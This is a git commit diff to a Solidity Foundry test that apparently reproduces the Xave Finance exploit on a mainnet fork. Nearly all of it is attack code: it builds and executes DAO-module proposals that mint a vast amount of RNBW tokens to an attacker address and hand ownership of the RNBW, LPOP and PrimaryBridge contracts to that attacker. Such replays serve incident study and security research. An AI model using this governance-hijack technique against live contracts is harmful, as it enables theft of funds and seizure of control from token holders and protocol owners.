cb3b5e13a2953c9c965b07e80b95b3981061c68a
Ziion <zzzuhaibmohd@gmail.com>
2022-10-10 01:57:58 -0700

    Xave PoC updated

--- src/test/XaveFinance_exp.sol
+++ src/test/XaveFinance_exp.sol
@@ -18,12 +18,17 @@ interface IDaoModule {
     function addProposal(string memory proposalId, bytes32[] memory txHashes) external;
 }
 
+interface IPrimaryBridge{
+    function owner() external view returns (address);
+}
+
 contract XaveFinanceExploit is DSTest {
     
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     
     IERC20 RNBW = IERC20(0xE94B97b6b43639E238c851A7e693F50033EfD75C);
     IERC20 LPOP = IERC20(0x6335A2E4a2E304401fcA4Fc0deafF066B813D055);
+    IPrimaryBridge PrimaryBridge =  IPrimaryBridge(0x579270F151D142eb8BdC081043a983307Aa15786);
     IDaoModule daoModule = IDaoModule(0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F);
 
     address attacker = 0x0f44f3489D17e42ab13A6beb76E57813081fc1E2;
@@ -33,13 +38,30 @@ contract XaveFinanceExploit is DSTest {
         cheats.createSelectFork("mainnet", 15704745); // fork mainnet at 15704745 
     }
 
+    function encodeWithSignature_mint(address to, uint amount)
+        internal
+        pure
+        returns (bytes memory)
+    {
+        return abi.encodeWithSignature("mint(address,uint256)", to, amount);
+    }
+
+    function encodeWithSignature_transferOwnership(address to)
+        internal
+        pure
+        returns (bytes memory)
+    {
+        return abi.encodeWithSignature("transferOwnership(address)", to);
+    }
+
     function testAttack() public {
         
         //tx to mint 100000000000000 $RNBW tokens
         bytes32 tx0 = daoModule.getTransactionHash(
             0xE94B97b6b43639E238c851A7e693F50033EfD75C,
             0,
-            hex"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000",
+            encodeWithSignature_mint(attacker, 100000000000000000000000000000000),
+            //hex"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000",
             Enum.Operation(0),
             0
         );
@@ -48,7 +70,8 @@ contract XaveFinanceExploit is DSTest {
         bytes32 tx1 = daoModule.getTransactionHash(
             0xE94B97b6b43639E238c851A7e693F50033EfD75C,
             0,
-            hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
+            encodeWithSignature_transferOwnership(attacker),
+            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
             Enum.Operation(0),
             1
         );
@@ -57,16 +80,18 @@ contract XaveFinanceExploit is DSTest {
         bytes32 tx2 = daoModule.getTransactionHash(
             0x6335A2E4a2E304401fcA4Fc0deafF066B813D055,
             0,
-            hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
+            encodeWithSignature_transferOwnership(attacker),
+            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
             Enum.Operation(0),
             2
         );
 
-        //will try to use abi.decode() to find out
+        //tx to transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
         bytes32 tx3 = daoModule.getTransactionHash(
             0x579270F151D142eb8BdC081043a983307Aa15786,
             0,
-            hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
+            encodeWithSignature_transferOwnership(attacker),
+            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
             Enum.Operation(0),
             3
         );
@@ -80,8 +105,8 @@ contract XaveFinanceExploit is DSTest {
         
         emit log_named_address("[Before proposal Execution] Owner of $RNBW: ", RNBW.owner());
         emit log_named_address("[Before proposal Execution] Owner of $LPOP: ", LPOP.owner());
+        emit log_named_address("[Before proposal Execution] Owner of PrimaryBridge: ", PrimaryBridge.owner());
         emit log_named_uint("[Before proposal Execution] Attacker's $RNBW Token Balance: ", RNBW.balanceOf(attacker) / 1 ether);
-
         cheats.startPrank(attackerContract);
 
         //Execute mint 100000000000000 $RNBW tokens
@@ -90,7 +115,8 @@ contract XaveFinanceExploit is DSTest {
             txIDs,
             0xE94B97b6b43639E238c851A7e693F50033EfD75C,
             0,
-            hex"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000",
+            encodeWithSignature_mint(attacker, 100000000000000000000000000000000),
+            //hex"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000",
             Enum.Operation(0),
             0
         );
@@ -101,7 +127,8 @@ contract XaveFinanceExploit is DSTest {
             txIDs,
             0xE94B97b6b43639E238c851A7e693F50033EfD75C,
             0,
-            hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
+            encodeWithSignature_transferOwnership(attacker),
+            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
             Enum.Operation(0),
             1
         );
@@ -112,18 +139,20 @@ contract XaveFinanceExploit is DSTest {
             txIDs,
             0x6335A2E4a2E304401fcA4Fc0deafF066B813D055,
             0,
-            hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
+            encodeWithSignature_transferOwnership(attacker),
+            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
             Enum.Operation(0),
             2
         );
 
-        //need to research
+        //Execute transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
         daoModule.executeProposalWithIndex(
             "2",
             txIDs,
             0x579270F151D142eb8BdC081043a983307Aa15786,
             0,
-            hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
+            encodeWithSignature_transferOwnership(attacker),
+            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
             Enum.Operation(0),
             3
         );
@@ -133,6 +162,8 @@ contract XaveFinanceExploit is DSTest {
         emit log_string("--------------------------------------------------------------");
         emit log_named_address("[After proposal Execution] Owner of $RNBW: ", RNBW.owner());
         emit log_named_address("[After proposal Execution] Owner of $LPOP: ", LPOP.owner());
+        emit log_named_address("[After proposal Execution] Owner of PrimaryBridge: ", PrimaryBridge.owner());
         emit log_named_uint("[After proposal Execution] Attacker's $RNBW Token Balance: ", RNBW.balanceOf(attacker) / 1 ether);
     }
+    
 }
